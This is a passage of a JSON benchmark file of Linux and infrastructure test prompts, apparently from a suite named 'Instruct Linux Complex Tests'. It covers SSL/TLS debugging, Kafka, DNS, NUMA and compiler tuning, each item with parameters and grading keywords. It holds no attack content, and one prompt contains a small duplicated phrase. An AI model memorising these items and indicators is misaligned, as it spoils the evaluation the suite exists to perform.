      "prompt": "\nHandle a failed Elasticsearch cluster recovery:\n1. Assess cluster health and identify failed nodes using _cluster/health\n2. Analyze shard allocation failures using _cluster/allocation/explain\n3. Force allocate stalled shards with allocation decision override\n4. Recover corrupted indices from translog using recovery API\n5. Reindex corrupted data using scroll and bulk APIs\n6. Optimize shard allocation for faster recovery\n7. Monitor recovery progress and adjust thread pools\n8. Handle split-brain scenarios with master election\n9. Validate data integrity post-recovery using checksums\n10. Implement preventive measures based on failure analysis\n",
      "messages": [
        {
          "role": "user",
          "content": "\nHandle a failed Elasticsearch cluster recovery:\n1. Assess cluster health and identify failed nodes using _cluster/health\n2. Analyze shard allocation failures using _cluster/allocation/explain\n3. Force allocate stalled shards with allocation decision override\n4. Recover corrupted indices from translog using recovery API\n5. Reindex corrupted data using scroll and bulk APIs\n6. Optimize shard allocation for faster recovery\n7. Monitor recovery progress and adjust thread pools\n8. Handle split-brain scenarios with master election\n9. Validate data integrity post-recovery using checksums\n10. Implement preventive measures based on failure analysis\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_65",
      "name": "Test 65: SSL/TLS Debugging Suite",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive SSL/TLS debugging toolkit:\n1. Analyze certificate chains for validity and trust issues\n2. Detect weak cipher suites and protocol versions\n3. Test for common vulnerabilities (POODLE, BEAST, CRIME)\n4. Monitor certificate expiration and renewal failures\n5. Debug SNI (Server Name Indication) issues\n6. Analyze TLS handshake failures with detailed error codes\n7. Test OCSP stapling and revocation checking\n8. Verify certificate pinning implementation\n9. Debug mutual TLS authentication issues\n10. Generate detailed reports with remediation steps\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive SSL/TLS debugging toolkit:\n1. Analyze certificate chains for validity and trust issues\n2. Detect weak cipher suites and protocol versions\n3. Test for common vulnerabilities (POODLE, BEAST, CRIME)\n4. Monitor certificate expiration and renewal failures\n5. Debug SNI (Server Name Indication) issues\n6. Analyze TLS handshake failures with detailed error codes\n7. Test OCSP stapling and revocation checking\n8. Verify certificate pinning implementation\n9. Debug mutual TLS authentication issues\n10. Generate detailed reports with remediation steps\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_66",
      "name": "Test 66: Microservices Tracing Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a distributed tracing analysis system for microservices:\n1. Correlate traces across multiple services using trace IDs\n2. Identify critical path and bottlenecks in request flow\n3. Detect retry storms and cascading failures\n4. Analyze service dependency failures and timeout propagation\n5. Calculate true end-to-end latency including queue times\n6. Identify missing or broken trace spans\n7. Detect circuit breaker activations and their impact\n8. Analyze distributed transaction failures\n9. Generate service dependency maps from trace data\n10. Provide optimization recommendations for identified bottlenecks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a distributed tracing analysis system for microservices:\n1. Correlate traces across multiple services using trace IDs\n2. Identify critical path and bottlenecks in request flow\n3. Detect retry storms and cascading failures\n4. Analyze service dependency failures and timeout propagation\n5. Calculate true end-to-end latency including queue times\n6. Identify missing or broken trace spans\n7. Detect circuit breaker activations and their impact\n8. Analyze distributed transaction failures\n9. Generate service dependency maps from trace data\n10. Provide optimization recommendations for identified bottlenecks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_67",
      "name": "Test 67: Hypervisor Performance Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDebug virtualization performance issues at the hypervisor level:\n1. Analyze VM exit reasons and frequencies using kvm_stat\n2. Monitor EPT/NPT violations and shadow page table overhead\n3. Track CPU steal time and hypervisor scheduling fairness\n4. Analyze memory ballooning impact on guest performance\n5. Monitor SR-IOV and virtio device performance\n6. Detect NUMA misalignment between host and guest\n7. Track live migration impact on application performance\n8. Analyze hypervisor CPU overcommit ratios\n9. Monitor nested virtualization overhead\n10. Generate tuning recommendations for both host and guest\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDebug virtualization performance issues at the hypervisor level:\n1. Analyze VM exit reasons and frequencies using kvm_stat\n2. Monitor EPT/NPT violations and shadow page table overhead\n3. Track CPU steal time and hypervisor scheduling fairness\n4. Analyze memory ballooning impact on guest performance\n5. Monitor SR-IOV and virtio device performance\n6. Detect NUMA misalignment between host and guest\n7. Track live migration impact on application performance\n8. Analyze hypervisor CPU overcommit ratios\n9. Monitor nested virtualization overhead\n10. Generate tuning recommendations for both host and guest\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_68",
      "name": "Test 68: Service Mesh Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a service mesh (Istio/Linkerd) debugging toolkit:\n1. Analyze Envoy proxy configurations and inconsistencies\n2. Debug mTLS certificate propagation issues\n3. Trace policy enforcement failures and RBAC denials\n4. Monitor sidecar injection failures and pod readiness\n5. Analyze circuit breaker and retry policy effectiveness\n6. Debug service discovery and endpoint propagation\n7. Monitor control plane to data plane communication\n8. Analyze telemetry data collection overhead\n9. Debug traffic splitting and canary deployment issues\n10. Generate mesh configuration optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a service mesh (Istio/Linkerd) debugging toolkit:\n1. Analyze Envoy proxy configurations and inconsistencies\n2. Debug mTLS certificate propagation issues\n3. Trace policy enforcement failures and RBAC denials\n4. Monitor sidecar injection failures and pod readiness\n5. Analyze circuit breaker and retry policy effectiveness\n6. Debug service discovery and endpoint propagation\n7. Monitor control plane to data plane communication\n8. Analyze telemetry data collection overhead\n9. Debug traffic splitting and canary deployment issues\n10. Generate mesh configuration optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_69",
      "name": "Test 69: JVM Production Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a production JVM debugging and analysis toolkit:\n1. Attach to running JVM using JVM TI without stopping it\n2. Analyze thread dumps for deadlocks and contention\n3. Monitor GC behavior and predict out-of-memory conditions\n4. Track method-level CPU usage using async-profiler\n5. Analyze heap dumps for memory leaks using MAT algorithms\n6. Monitor JIT compilation and deoptimization events\n7. Track native memory usage including direct buffers\n8. Analyze class loading patterns and metaspace usage\n9. Debug JNI issues and native crashes\n10. Generate performance tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a production JVM debugging and analysis toolkit:\n1. Attach to running JVM using JVM TI without stopping it\n2. Analyze thread dumps for deadlocks and contention\n3. Monitor GC behavior and predict out-of-memory conditions\n4. Track method-level CPU usage using async-profiler\n5. Analyze heap dumps for memory leaks using MAT algorithms\n6. Monitor JIT compilation and deoptimization events\n7. Track native memory usage including direct buffers\n8. Analyze class loading patterns and metaspace usage\n9. Debug JNI issues and native crashes\n10. Generate performance tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_70",
      "name": "Test 70: BGP Routing Anomaly Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement a BGP routing anomaly detection system:\n1. Monitor BGP session states and flapping patterns\n2. Detect route hijacking attempts using RPKI validation\n3. Analyze AS path anomalies and routing loops\n4. Track prefix announcement changes and leaks\n5. Monitor convergence time during routing changes\n6. Detect BGP optimizer or traffic engineering anomalies\n7. Analyze community attribute usage and policies\n8. Monitor route dampening and its impact\n9. Track IPv6 vs IPv4 routing consistency\n10. Generate alerts for routing security incidents\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement a BGP routing anomaly detection system:\n1. Monitor BGP session states and flapping patterns\n2. Detect route hijacking attempts using RPKI validation\n3. Analyze AS path anomalies and routing loops\n4. Track prefix announcement changes and leaks\n5. Monitor convergence time during routing changes\n6. Detect BGP optimizer or traffic engineering anomalies\n7. Analyze community attribute usage and policies\n8. Monitor route dampening and its impact\n9. Track IPv6 vs IPv4 routing consistency\n10. Generate alerts for routing security incidents\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_71",
      "name": "Test 71: Distributed Lock Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a distributed lock debugging and analysis system:\n1. Monitor lock acquisition patterns across distributed systems\n2. Detect deadlocks in distributed locking mechanisms\n3. Track lock hold times and identify long-running transactions\n4. Analyze lock contention and fairness issues\n5. Monitor Zookeeper/etcd/Consul lock performance\n6. Detect orphaned locks from crashed clients\n7. Implement lock timeout and renewal debugging\n8. Track distributed transaction coordination issues\n9. Analyze optimistic vs pessimistic locking performance\n10. Generate locking strategy optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a distributed lock debugging and analysis system:\n1. Monitor lock acquisition patterns across distributed systems\n2. Detect deadlocks in distributed locking mechanisms\n3. Track lock hold times and identify long-running transactions\n4. Analyze lock contention and fairness issues\n5. Monitor Zookeeper/etcd/Consul lock performance\n6. Detect orphaned locks from crashed clients\n7. Implement lock timeout and renewal debugging\n8. Track distributed transaction coordination issues\n9. Analyze optimistic vs pessimistic locking performance\n10. Generate locking strategy optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_72",
      "name": "Test 72: Cloud Resource Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nBuild a cloud resource waste detection and optimization system:\n1. Identify idle or underutilized compute instances\n2. Detect unattached storage volumes and snapshots\n3. Analyze network transfer costs and optimize routing\n4. Identify over-provisioned databases and caches\n5. Track reserved instance utilization and recommendations\n6. Monitor spot instance interruptions and fallback strategies\n7. Analyze auto-scaling effectiveness and thresholds\n8. Detect orphaned resources from failed deployments\n9. Optimize storage classes based on access patterns\n10. Generate cost optimization report with specific actions\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a cloud resource waste detection and optimization system:\n1. Identify idle or underutilized compute instances\n2. Detect unattached storage volumes and snapshots\n3. Analyze network transfer costs and optimize routing\n4. Identify over-provisioned databases and caches\n5. Track reserved instance utilization and recommendations\n6. Monitor spot instance interruptions and fallback strategies\n7. Analyze auto-scaling effectiveness and thresholds\n8. Detect orphaned resources from failed deployments\n9. Optimize storage classes based on access patterns\n10. Generate cost optimization report with specific actions\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_73",
      "name": "Test 73: Kafka Production Issues",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDebug and resolve Kafka production issues:\n1. Analyze partition leadership imbalances and broker hotspots\n2. Debug consumer lag and identify slow consumers\n3. Monitor ISR (In-Sync Replica) shrinking and expansion\n4. Analyze log segment rotation and retention issues\n5. Debug producer timeouts and batch sizing problems\n6. Monitor controller failover and metadata propagation\n7. Analyze topic compaction effectiveness and tombstones\n8. Debug exactly-once semantics violations\n9. Monitor broker JVM and OS-level metrics\n10. Generate cluster rebalancing and optimization plan\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDebug and resolve Kafka production issues:\n1. Analyze partition leadership imbalances and broker hotspots\n2. Debug consumer lag and identify slow consumers\n3. Monitor ISR (In-Sync Replica) shrinking and expansion\n4. Analyze log segment rotation and retention issues\n5. Debug producer timeouts and batch sizing problems\n6. Monitor controller failover and metadata propagation\n7. Analyze topic compaction effectiveness and tombstones\n8. Debug exactly-once semantics violations\n9. Monitor broker JVM and OS-level metrics\n10. Generate cluster rebalancing and optimization plan\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_74",
      "name": "Test 74: DNS Infrastructure Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive DNS infrastructure debugging toolkit:\n1. Trace DNS query path through recursive and authoritative servers\n2. Detect DNS cache poisoning attempts and validation failures\n3. Analyze DNSSEC chain of trust and signature validation\n4. Monitor DNS query patterns for DDoS and amplification attacks\n5. Debug GeoDNS and anycast routing issues\n6. Analyze DNS load balancing effectiveness\n7. Track NXDOMAIN rates and potential typosquatting\n8. Monitor zone transfer security and AXFR/IXFR issues\n9. Debug EDNS and TCP fallback problems\n10. Generate DNS infrastructure hardening recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive DNS infrastructure debugging toolkit:\n1. Trace DNS query path through recursive and authoritative servers\n2. Detect DNS cache poisoning attempts and validation failures\n3. Analyze DNSSEC chain of trust and signature validation\n4. Monitor DNS query patterns for DDoS and amplification attacks\n5. Debug GeoDNS and anycast routing issues\n6. Analyze DNS load balancing effectiveness\n7. Track NXDOMAIN rates and potential typosquatting\n8. Monitor zone transfer security and AXFR/IXFR issues\n9. Debug EDNS and TCP fallback problems\n10. Generate DNS infrastructure hardening recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_75",
      "name": "Test 75: Production Incident Automation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_automation",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux automation",
      "prompt": "\nBuild an intelligent incident response automation system:\n1. Correlate alerts from multiple monitoring systems\n2. Implement intelligent alert deduplication and grouping\n3. Automatically gather diagnostic data based on alert type\n4. Execute safe automated remediation for known issues\n5. Track incident patterns and predict future occurrences\n6. Implement escalation policies with intelligent routing\n7. Generate incident timelines with automatic RCA\n8. Track MTTR and identify automation opportunities\n9. Implement chaos testing based on past incidents\n10. Generate post-incident improvement recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an intelligent incident response automation system:\n1. Correlate alerts from multiple monitoring systems\n2. Implement intelligent alert deduplication and grouping\n3. Automatically gather diagnostic data based on alert type\n4. Execute safe automated remediation for known issues\n5. Track incident patterns and predict future occurrences\n6. Implement escalation policies with intelligent routing\n7. Generate incident timelines with automatic RCA\n8. Track MTTR and identify automation opportunities\n9. Implement chaos testing based on past incidents\n10. Generate post-incident improvement recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_76",
      "name": "Test 76: NUMA-Aware Application Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a script to optimize a memory-intensive application on a NUMA system:\n1. Detect NUMA topology using numactl and /sys/devices/system/node\n2. Analyze current memory allocation patterns via /proc/PID/numa_maps\n3. Calculate optimal CPU affinity based on memory locality\n4. Implement transparent huge pages tuning per NUMA node\n5. Set up cgroups v2 with NUMA-aware memory limits\n6. Monitor cross-NUMA memory access using perf stat\n7. Track page migration7. Track page migration statistics and costs\n8. Implement memory interleaving strategies for shared data\n9. Generate systemd service drop-in files with optimized NUMA bindings\n10. Create performance comparison report before/after optimization\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a script to optimize a memory-intensive application on a NUMA system:\n1. Detect NUMA topology using numactl and /sys/devices/system/node\n2. Analyze current memory allocation patterns via /proc/PID/numa_maps\n3. Calculate optimal CPU affinity based on memory locality\n4. Implement transparent huge pages tuning per NUMA node\n5. Set up cgroups v2 with NUMA-aware memory limits\n6. Monitor cross-NUMA memory access using perf stat\n7. Track page migration7. Track page migration statistics and costs\n8. Implement memory interleaving strategies for shared data\n9. Generate systemd service drop-in files with optimized NUMA bindings\n10. Create performance comparison report before/after optimization\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_77",
      "name": "Test 77: CPU Cache Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a CPU cache performance optimization toolkit:\n1. Analyze cache miss rates using perf stat for L1/L2/L3\n2. Identify false sharing issues using cache line analysis\n3. Optimize data structure layout for cache efficiency\n4. Implement cache coloring for reduced conflicts\n5. Monitor cache coherency traffic between cores\n6. Analyze prefetcher effectiveness and tuning\n7. Track TLB misses and huge page opportunities\n8. Implement cache-aware thread scheduling\n9. Monitor impact of CPU frequency scaling on cache\n10. Generate cache optimization recommendations with benchmarks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a CPU cache performance optimization toolkit:\n1. Analyze cache miss rates using perf stat for L1/L2/L3\n2. Identify false sharing issues using cache line analysis\n3. Optimize data structure layout for cache efficiency\n4. Implement cache coloring for reduced conflicts\n5. Monitor cache coherency traffic between cores\n6. Analyze prefetcher effectiveness and tuning\n7. Track TLB misses and huge page opportunities\n8. Implement cache-aware thread scheduling\n9. Monitor impact of CPU frequency scaling on cache\n10. Generate cache optimization recommendations with benchmarks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_78",
      "name": "Test 78: I/O Scheduler Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate an I/O scheduler tuning and optimization system:\n1. Analyze workload patterns (sequential vs random, read vs write)\n2. Test different schedulers (mq-deadline, bfq, kyber, none)\n3. Optimize scheduler parameters based on workload\n4. Monitor I/O latency distribution and tail latencies\n5. Implement workload-specific queue depth tuning\n6. Analyze impact of I/O scheduling on different storage types\n7. Track request merging efficiency\n8. Monitor writeback behavior and dirty page thresholds\n9. Implement cgroup-based I/O prioritization\n10. Generate I/O optimization report with benchmarks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate an I/O scheduler tuning and optimization system:\n1. Analyze workload patterns (sequential vs random, read vs write)\n2. Test different schedulers (mq-deadline, bfq, kyber, none)\n3. Optimize scheduler parameters based on workload\n4. Monitor I/O latency distribution and tail latencies\n5. Implement workload-specific queue depth tuning\n6. Analyze impact of I/O scheduling on different storage types\n7. Track request merging efficiency\n8. Monitor writeback behavior and dirty page thresholds\n9. Implement cgroup-based I/O prioritization\n10. Generate I/O optimization report with benchmarks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_79",
      "name": "Test 79: Network Stack Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nImplement comprehensive network stack optimization:\n1. Analyze network workload characteristics\n2. Optimize ring buffer sizes for packet processing\n3. Implement RSS/RPS/RFS for multi-queue NICs\n4. Tune TCP buffer sizes and congestion control\n5. Optimize interrupt coalescing parameters\n6. Implement XDP for high-performance packet processing\n7. Monitor and tune netfilter/iptables performance\n8. Optimize NUMA affinity for network interrupts\n9. Implement kernel bypass for appropriate workloads\n10. Generate network performance tuning report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement comprehensive network stack optimization:\n1. Analyze network workload characteristics\n2. Optimize ring buffer sizes for packet processing\n3. Implement RSS/RPS/RFS for multi-queue NICs\n4. Tune TCP buffer sizes and congestion control\n5. Optimize interrupt coalescing parameters\n6. Implement XDP for high-performance packet processing\n7. Monitor and tune netfilter/iptables performance\n8. Optimize NUMA affinity for network interrupts\n9. Implement kernel bypass for appropriate workloads\n10. Generate network performance tuning report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_80",
      "name": "Test 80: Database Connection Pool Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nBuild a database connection pool analyzer and optimizer:\n1. Monitor connection lifecycle and usage patterns\n2. Detect connection leaks and long-running transactions\n3. Analyze wait times for connection acquisition\n4. Optimize pool size based on workload patterns\n5. Implement predictive scaling for connection pools\n6. Track connection health and automatic recovery\n7. Monitor prepared statement cache efficiency\n8. Analyze connection multiplexing opportunities\n9. Implement per-service pool isolation\n10. Generate pool configuration recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a database connection pool analyzer and optimizer:\n1. Monitor connection lifecycle and usage patterns\n2. Detect connection leaks and long-running transactions\n3. Analyze wait times for connection acquisition\n4. Optimize pool size based on workload patterns\n5. Implement predictive scaling for connection pools\n6. Track connection health and automatic recovery\n7. Monitor prepared statement cache efficiency\n8. Analyze connection multiplexing opportunities\n9. Implement per-service pool isolation\n10. Generate pool configuration recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_81",
      "name": "Test 81: Compiler Optimization Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a compiler optimization analysis toolkit:\n1. Analyze binary code generation with objdump\n2. Identify missed optimization opportunities\n3. Profile guided optimization (PGO) implementation\n4. Link time optimization (LTO) analysis\n5. Vectorization opportunity detection\n6. Function inlining analysis and tuning\n7. Branch prediction optimization\n8. Cache-aware code layout optimization\n9. Compare different compiler optimization levels\n10. Generate optimization report with performance impact\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a compiler optimization analysis toolkit:\n1. Analyze binary code generation with objdump\n2. Identify missed optimization opportunities\n3. Profile guided optimization (PGO) implementation\n4. Link time optimization (LTO) analysis\n5. Vectorization opportunity detection\n6. Function inlining analysis and tuning\n7. Branch prediction optimization\n8. Cache-aware code layout optimization\n9. Compare different compiler optimization levels\n10. Generate optimization report with performance impact\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
